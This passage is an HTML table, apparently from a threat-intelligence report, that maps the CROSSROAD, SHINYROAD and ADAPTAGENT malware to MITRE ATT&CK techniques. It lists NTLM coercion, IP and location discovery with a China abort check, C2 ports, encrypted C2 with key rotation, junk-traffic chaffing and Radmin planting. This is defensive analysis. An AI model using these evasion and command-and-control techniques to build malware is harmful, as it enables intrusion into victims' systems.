<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Forced Authentication</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">WebDAV NTLM coercion via an invisible 1x1 popup rendering a UNC resource, configured inside </span><code style="vertical-align:baseline">Notifycfg.ini</code><span style="vertical-align:baseline">.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1016/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1016</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">System Network Configuration Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">CROSSROAD resolves the host's external IP via </span><code style="vertical-align:baseline">myip.opendns.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">o-o.myaddr.l.google.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">checkip.amazonaws.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">api.ipify.org</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">ifconfig.me/ip</code><span style="vertical-align:baseline">, and </span><code style="vertical-align:baseline">icanhazip.com</code><span style="vertical-align:baseline">.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1614/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1614</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">System Location Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">CROSSROAD aborts its primary payload execution path when the IP-derived country code is </span><code style="vertical-align:baseline">"CN"</code><span style="vertical-align:baseline"> (China).</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1082/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1082</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">System Information Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">SHINYROAD fingerprints the victim hostname to derive a unique agent identifier.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1033/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1033</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">System Owner/User Discovery</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">SHINYROAD incorporates the logged-on username into its unique agent identifier and C2 key derivation.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Command and Control</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1105/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1105</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Ingress Tool Transfer</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">CROSSROAD downloads </span><code style="vertical-align:baseline">component.zip</code><span style="vertical-align:baseline"> / </span><code style="vertical-align:baseline">en.zip</code><span style="vertical-align:baseline"> to </span><code style="vertical-align:baseline">%TEMP%\svc&lt;random_hex&gt;.tmp</code><span style="vertical-align:baseline"> and unpacks it to </span><code style="vertical-align:baseline">%LOCALAPPDATA%\Radmin\</code><span style="vertical-align:baseline">.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Command and Control</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1571/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1571</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Non-Standard Port</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">SHINYROAD custom binary C2 over TCP </span><code style="vertical-align:baseline">41397</code><span style="vertical-align:baseline">; ADAPTAGENT beacons over TCP </span><code style="vertical-align:baseline">6800</code><span style="vertical-align:baseline">.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Command and Control</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1573/001/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1573.001</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Encrypted Channel: Symmetric Cryptography</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Custom binary C2 stream encrypted with a hardcoded handshake key, rotating to a host-specific key derived from the agent ID.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Command and Control</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1001/001/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1001.001</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Data Obfuscation: Junk Data</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">SHINYROAD generates randomized junk packets (traffic chaffing) to disrupt network signature matching.</span></p>
</td>
</tr>
<tr>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Command and Control</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><a href="https://attack.mitre.org/techniques/T1219/002/" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">T1219.002</span></a></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Remote Access Tools: Remote Desktop Software</span></p>
</td>
<td style="vertical-align:top;border:1px solid #000000;padding:16px">
<p><span style="vertical-align:baseline">Deployment of legitimate Famatech Radmin 3.x server components to victim hosts alongside the SHINYROAD backdoor.</span></p>
</td>
</tr>
